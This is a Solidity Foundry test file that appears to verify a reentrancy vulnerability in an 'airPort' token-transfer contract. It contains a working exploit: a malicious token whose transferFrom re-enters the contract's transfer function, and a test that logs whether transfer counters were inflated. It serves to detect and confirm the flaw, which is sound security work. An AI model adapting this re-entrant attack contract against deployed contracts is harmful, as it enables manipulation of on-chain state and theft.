// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol";

contract MaliciousToken {
    airPort public airport;
    address public attacker;
    uint256 public observedValue;
    bool public reentered;

    constructor(address _airport, address _attacker) {
        airport = airPort(_airport);
        attacker = _attacker;
    }

    function transferFrom(address, address to, uint256 /* value */) external returns (bool) {
        // Only reenter when specific recipient is detected
        if (!reentered && to == address(0xbbb)) {
            reentered = true;
            // Record state during reentrance (expected to be 200 if two transfers processed)
            observedValue = airport.userTokenTransfers(attacker, address(this));
            // Perform reentrant call
            address[] memory singleRecipient = new address[](1);
            singleRecipient[0] = address(0xccc);
            airport.transfer(attacker, address(this), singleRecipient, 100);
        }
        return true;
    }
}

contract ReentrancyTest is Test {
    airPort public airport;
    MaliciousToken public maliciousToken;
    
    function setUp() public {
        airport = new airPort();
        maliciousToken = new MaliciousToken(address(airport), address(this));
    }

    function testReentrancyVulnerability() public {
        address attacker = address(this);
        address[] memory recipients = new address[](2);
        recipients[0] = address(0xaaa);
        recipients[1] = address(0xbbb);

        console.log("--- BEFORE-Trigger State ---");
        uint256 tokenTransfersBefore = airport.userTokenTransfers(attacker, address(maliciousToken));
        uint256 totalTransfersBefore = airport.totalTransfers(attacker);
        console.log("Initial token transfers: %s", tokenTransfersBefore);
        console.log("Initial total transfers: %s", totalTransfersBefore);

        console.log("--- Trigger Reentrancy Attack ---");
        airport.transfer(attacker, address(maliciousToken), recipients, 100);

        console.log("--- AFTER-Trigger State ---");
        uint256 tokenTransfersAfter = airport.userTokenTransfers(attacker, address(maliciousToken));
        uint256 totalTransfersAfter = airport.totalTransfers(attacker);
        console.log("Final token transfers: %s", tokenTransfersAfter);
        console.log("Final total transfers: %s", totalTransfersAfter);

        uint256 tokenTransferDiff = tokenTransfersAfter - tokenTransfersBefore;
        uint256 totalTransferDiff = totalTransfersAfter - totalTransfersBefore;

        bool tokenIncreaseValid = tokenTransferDiff == 300;
        bool totalIncreaseValid = totalTransferDiff == 3;
        bool attackSucceeded = tokenIncreaseValid && totalIncreaseValid;

        console.log("--- Verification Result ---");
        console.log("Observed reentrancy value:", maliciousToken.observedValue());
        console.log("Token transfers difference: %s (expected 300)", tokenTransferDiff);
        console.log("Total transfers difference: %s (expected 3)", totalTransferDiff);
        console.log("Attack succeeded:", attackSucceeded ? "YES" : "NO");

        // Final vulnerability verdict
        if (attackSucceeded) {
            console.log("Vulnerability Exists: Successful reentrancy attack increased token transfers by 300 and total transfers by 3");
        } else {
            console.log("Vulnerability not Exist: State changes (token transfer diff: %s, total transfer diff: %s) don't match expected attack patterns", tokenTransferDiff, totalTransferDiff);
        }
    }
}